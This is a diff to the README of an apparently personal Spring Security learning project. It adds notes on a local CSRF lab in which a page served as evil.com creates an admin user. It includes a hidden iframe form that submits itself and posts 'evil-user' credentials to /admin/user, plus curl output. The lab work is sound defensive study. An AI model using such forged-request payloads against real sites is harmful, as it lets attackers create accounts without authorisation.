@@ -7,7 +7,21 @@
 - [x] Check we can invoke spring security formLogin endpoint via axios
 - [x] Check axios will write JSESSIONID back to browser cookie automatically
 - [ ] Check axios will write csrf-token to browser automatically
-- [ ] Custom login page( SURPRISE! )
+- [x] Custom login page( SURPRISE! )
+
+## CSRF测试
+
+### csrf attack
+
+- 启动根项目，端口8080
+- 启动frontend目录下的vite项目(good.com）, 访问http://localhost:5173/, 确保admin处于登录状态
+- 启动evil目录下的项目，端口8888， 修改/etc/hosts, 加入evil.com 127.0.0.1
+- 访问http://evil.com:8888, 观察Console: evil user created
+
+### protect csrf
+
+- 打开根项目中的SecurityConfig, 注释掉 `http.csrf().disable()`
+- 重启根项目，访问http://evil.com:8888, 观察Console:
 
 ## formLogin的坑
 
@@ -130,7 +144,52 @@ content-type自动变为`'application/x-www-form-urlencoded`， 如果向下面�
 验证checkpoint 1时 `GET /login`直接报csrf的错误，
 所以我一开始就设置了`http.csrf(csrf -> csrf.ignoringAntMatchers("/login"));`, 原因很简单，GET请求不太需要csrf.
 
+## Spring Boot CSRF attack真困难
 
+### 1. 首先form必须使用application/json
+
+但是html form的enctype属性无法设置为`application/json`（即使设置了也会被忽略）
+
+```
+Resolved [org.springframework.web.HttpMediaTypeNotSupportedException: Content type 'application/x-www-form-urlencoded;charset=UTF-8' not supported]
+```
+
+```bash
+curl -i -X POST -d "username=xx&passwod=yy" http://localhost:8080/admin/user
+HTTP/1.1 415
+Accept: application/json, application/*+json
+
+{"timestamp":"2022-10-15T03:38:29.709+00:00","status":415,"error":"Unsupported Media Type","path":"/admin/user"}%
+```
+
+通过js脚本? https://github.com/keithhackbarth/submitAsJSON, 我尝试了不好用!
+
+我提了一个issue:https://github.com/keithhackbarth/submitAsJSON/issues/2
+
+通过Flash？ [Exploiting CSRF on JSON endpoints with Flash and redirects](https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b)
+
+### 2. evil.com不能使用iframe
+
+错误: Refused to display 'http://localhost:8080/' in a frame because it set 'X-Frame-Options' to 'deny'.
+
+不成功的代码：
+
+```html
+
+<iframe style="display:none" name="csrf-frame"></iframe>
+
+<form target="csrf-frame" action="http://localhost:8080/admin/user" method="post"
+      enctype="application/json">
+    <input name="username" type="hidden" value="evil-user">
+    <input name="password" type="hidden" value="evil-password">
+</form>
+
+<script>
+    document.forms[0].submit()
+</script>
+```
+
+这是因为good.com的默认response header中包含 `X-Frame-Options: DENY`
 
 
 
